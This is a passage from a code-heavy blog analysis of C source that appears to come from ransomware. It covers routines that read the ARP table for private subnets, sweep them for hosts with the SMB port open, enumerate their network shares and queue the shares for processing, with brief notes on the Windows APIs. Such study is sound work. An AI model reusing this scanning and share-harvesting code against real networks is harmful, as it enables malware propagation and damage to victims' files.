	<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetSubnets"><a href="#GetSubnets" class="headerlink" title="GetSubnets"></a>GetSubnets</h4><ul>
<li>GetIpNetTable<ul>
<li>GetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the table size)</li>
<li>ULONG Result &#x3D; (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the result)</li>
<li>The <strong>GetIfTable</strong> function retrieves the MIB-II interface table.</li>
</ul>
</li>
</ul>
<p>if the ip is start with “172.”,”192.168.”,”10.”,”169.”, there are subnets in this host.</p>
<p>And check if the subnet is already in the SubnetList . If not , add this SubnetInfo into SubnetList</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);</span><br><span class="line">	<span class="keyword">if</span> (!IpNetTable) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);</span><br><span class="line">	<span class="keyword">if</span> (Result != ERROR_SUCCESS) &#123;</span><br><span class="line">		</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;GetIpNetTable fails. GetLastError = %lu&quot;</span>), pGetLastError());</span><br><span class="line">		<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IpNetTable-&gt;dwNumEntries; i++) &#123;</span><br><span class="line"></span><br><span class="line">		WCHAR wszIpAddress[INET_ADDRSTRLEN];</span><br><span class="line">		ULONG dwAddress = IpNetTable-&gt;table[i].dwAddr;	</span><br><span class="line">		PUCHAR HardwareAddres = IpNetTable-&gt;table[i].bPhysAddr;</span><br><span class="line">		ULONG HardwareAddressSize = IpNetTable-&gt;table[i].dwPhysAddrLen;</span><br><span class="line">		</span><br><span class="line">		RtlSecureZeroMemory(wszIpAddress, <span class="keyword">sizeof</span>(wszIpAddress));</span><br><span class="line"></span><br><span class="line">		IN_ADDR InAddr;</span><br><span class="line">		InAddr.S_un.S_addr = dwAddress;</span><br><span class="line">		PCHAR szIpAddress = pinet_ntoa(InAddr);</span><br><span class="line">		DWORD le = WSAGetLastError();</span><br><span class="line"></span><br><span class="line">		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;172.&quot;</span>));</span><br><span class="line">		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;192.168.&quot;</span>));</span><br><span class="line">		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;10.&quot;</span>));</span><br><span class="line">		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;169.&quot;</span>));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (p1 == szIpAddress ||</span><br><span class="line">			p2 == szIpAddress ||</span><br><span class="line">			p3 == szIpAddress ||</span><br><span class="line">			p4 == szIpAddress)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			BOOL Found = FALSE;</span><br><span class="line"></span><br><span class="line">			PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line">			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!<span class="built_in">memcmp</span>(&amp;SubnetInfo-&gt;dwAddress, &amp;dwAddress, <span class="number">3</span>)) &#123;</span><br><span class="line"></span><br><span class="line">					Found = TRUE;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!Found) &#123;</span><br><span class="line"></span><br><span class="line">				BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">				*(ULONG*)bAddres = dwAddress;</span><br><span class="line">				bAddres[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(<span class="keyword">sizeof</span>(SUBNET_INFO));</span><br><span class="line">				<span class="keyword">if</span> (!NewSubnet) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				RtlCopyMemory(&amp;NewSubnet-&gt;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line">				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="HostHandler"><a href="#HostHandler" class="headerlink" title="HostHandler"></a>HostHandler</h4><ul>
<li><p><code>pEnterCriticalSection(&amp;g_CriticalSection);</code></p>
<ul>
<li><p>When more than one processes access a same code segment that segment is known as critical section. Critical section contains shared variables or resources which are needed to be synchronized to maintain consistency of data variable.<a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
<ul>
<li><p>&#96;&#96;&#96;c<br>  pEnterCriticalSection(&amp;g_CriticalSection);</p>
<p>  PHOST_INFO HostInfo &#x3D; TAILQ_FIRST(&amp;g_HostList);<br>  if (HostInfo &#x3D;&#x3D; NULL) {<br>  pLeaveCriticalSection(&amp;g_CriticalSection);<br>  pSleep(1000);<br>  continue;<br>      }<br>  TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);<br>  pLeaveCriticalSection(&amp;g_CriticalSection);</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);`</span><br><span class="line"></span><br><span class="line">    - get the host&#x27;s shareinfo </span><br><span class="line"></span><br><span class="line">- `threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);`</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line">HostHandler(__in PVOID pArg)</span><br><span class="line">&#123;</span><br><span class="line">	network_scanner::SHARE_LIST ShareList;</span><br><span class="line">	TAILQ_INIT(&amp;ShareList);</span><br><span class="line"></span><br><span class="line">	while (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		pEnterCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList);</span><br><span class="line">		if (HostInfo == NULL) &#123;</span><br><span class="line"></span><br><span class="line">			pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">			pSleep(1000);</span><br><span class="line">			continue;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line">		pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		if (HostInfo-&gt;dwAddres == STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line">			free(HostInfo);</span><br><span class="line">			pExitThread(EXIT_SUCCESS);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		network_scanner::EnumShares(HostInfo-&gt;wszAddress, &amp;ShareList);</span><br><span class="line">		while (!TAILQ_EMPTY(&amp;ShareList))</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);</span><br><span class="line">			logs::Write(OBFW(L&quot;Starting search on share %s.&quot;), ShareInfo-&gt;wszSharePath);</span><br><span class="line">			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);</span><br><span class="line">			TAILQ_REMOVE(&amp;ShareList, ShareInfo, Entries);</span><br><span class="line">			free(ShareInfo);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		free(HostInfo);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="CreateHostTable"><a href="#CreateHostTable" class="headerlink" title="CreateHostTable"></a>CreateHostTable</h4><ul>
<li>WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);<ul>
<li>socket with tcp</li>
</ul>
</li>
<li>bind<ul>
<li>The <strong>bind</strong> function associates a local address with a socket.</li>
</ul>
</li>
<li>CreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)<ul>
<li>Creates an input&#x2F;output (I&#x2F;O) completion port and associates it with a specified file handle, or creates an I&#x2F;O completion port that is not yet associated with a file handle, allowing association at a later time.</li>
<li>If the function succeeds, the return value is the handle to an I&#x2F;O completion port</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">CreateHostTable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&amp;g_SubnetList);</span><br><span class="line">	<span class="keyword">if</span> (!SubnetInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">	DWORD dwAddress;</span><br><span class="line">	RtlCopyMemory(bAddres, &amp;SubnetInfo-&gt;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (BYTE i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">		bAddres[<span class="number">3</span>] = i;</span><br><span class="line">		RtlCopyMemory(&amp;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, <span class="keyword">sizeof</span>(CONNECT_CONTEXT));</span><br><span class="line">		<span class="keyword">if</span> (!ConnectCtx) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ConnectCtx-&gt;dwAddres = dwAddress;</span><br><span class="line">		ConnectCtx-&gt;State = NOT_CONNECTED;</span><br><span class="line">		ConnectCtx-&gt;s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, WSA_FLAG_OVERLAPPED);</span><br><span class="line">		<span class="keyword">if</span> (ConnectCtx-&gt;s == INVALID_SOCKET) &#123;</span><br><span class="line"></span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, <span class="keyword">sizeof</span>(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = <span class="number">0</span>;</span><br><span class="line">		SockAddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pbind(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, <span class="keyword">sizeof</span>(SockAddr)) != ERROR_SUCCESS) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pCreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_REMOVE(&amp;g_SubnetList, SubnetInfo, Entries);</span><br><span class="line">	<span class="built_in">free</span>(SubnetInfo);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ScanHosts"><a href="#ScanHosts" class="headerlink" title="ScanHosts"></a>ScanHosts</h4><ul>
<li><p>ConnectEx</p>
<ul>
<li><p>The <strong>ConnectEx</strong> function establishes a connection to a specified socket, and optionally sends data once the connection is established. The <strong>ConnectEx</strong> function is only supported on connection-oriented sockets.</p>
<ul>
<li><p>&#96;&#96;&#96;<br>  LPFN_CONNECTEX LpfnConnectex;</p>
<p>  BOOL LpfnConnectex(<br>[in]           SOCKET s,<br>[in]           const sockaddr *name,<br>[in]           int namelen,<br>[in, optional] PVOID lpSendBuffer,<br>[in]           DWORD dwSendDataLength,<br>[out]          LPDWORD lpdwBytesSent,<br>[in]           LPOVERLAPPED lpOverlapped<br>  )<br>  {…}</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">VOID</span><br><span class="line">ScanHosts()</span><br><span class="line">&#123;</span><br><span class="line">	PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">	TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesSent;</span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = htons(SMB_PORT);</span><br><span class="line">		SockAddr.sin_addr.s_addr = ConnectCtx-&gt;dwAddres;</span><br><span class="line"></span><br><span class="line">		if (g_ConnectEx(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr), NULL, 0, &amp;dwBytesSent, (LPOVERLAPPED)ConnectCtx)) &#123;</span><br><span class="line"></span><br><span class="line">			ConnectCtx-&gt;State = CONNECTED;</span><br><span class="line">			AddHost(ConnectCtx-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		else if (WSA_IO_PENDING == WSAGetLastError()) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations++;</span><br><span class="line">			ConnectCtx-&gt;State = CONNECTING;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="AddHost"><a href="#AddHost" class="headerlink" title="AddHost"></a>AddHost</h4><ul>
<li>add the new-found host to the Host table</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">AddHost</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in DWORD dwAddres</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_HostEntry) &#123;</span><br><span class="line">		INT i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (g_HostEntry-&gt;h_addr_list[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry-&gt;h_addr_list[i++];</span><br><span class="line">			<span class="keyword">if</span> (dwCurrentAddr == dwAddres) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(<span class="keyword">sizeof</span>(HOST_INFO));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!HostInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwAddress = INET_ADDRSTRLEN;</span><br><span class="line">	SOCKADDR_IN temp;</span><br><span class="line">	temp.sin_addr.s_addr = dwAddres;</span><br><span class="line">	temp.sin_port = <span class="number">0</span>;</span><br><span class="line">	temp.sin_family = AF_INET;</span><br><span class="line">	HostInfo-&gt;dwAddres = dwAddres;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwAddres != STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&amp;temp, <span class="keyword">sizeof</span>(temp), <span class="literal">NULL</span>, HostInfo-&gt;wszAddress, &amp;dwAddres)) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(HostInfo);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pEnterCriticalSection(&amp;g_CriticalSection); &#123;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="PortScanHandler"><a href="#PortScanHandler" class="headerlink" title="PortScanHandler"></a>PortScanHandler</h4><p>this handler use the <code>CompletionStatus,IsTimerActivated,g_ActiveOperations</code> to control the code flow.</p>
<ul>
<li>g_ActiveOperations<ul>
<li>use to count the Socket.</li>
<li><code>ScanHosts</code> function: when one host is found ,the value is add by one</li>
<li>if <code>CompletionStatus == CONNECT_COMPLETION_KEY</code>, the value sub by one.</li>
</ul>
</li>
<li>IsTimerActivated<ul>
<li>used to check after the timer.<ul>
<li>IsTimerActivated is True,</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>four scenes</p>
<ol>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect Success</p>
<ol>
<li><p>if g_ActiveOperations is zero ,then scanHost again</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<pre><code> if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;
 
     ConnectContext-&gt;State = CONNECTED;
     AddHost(ConnectContext-&gt;dwAddres);
 
 &#125;
</code></pre>
</li>
</ol>
</li>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect fail</p>
<ol>
<li>the same as before</li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">			ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>CompletionStatus &#x3D;&#x3D; TIMER_COMPLETION_KEY and g_ActiveOperations, so the connecting is Active.We can Cancel it now.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					if (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><code>CompletionStatus == TIMER_COMPLETION_KEY and  g_ActiveOperations == 0</code> , the socket is out-of-time.</li>
</ol>
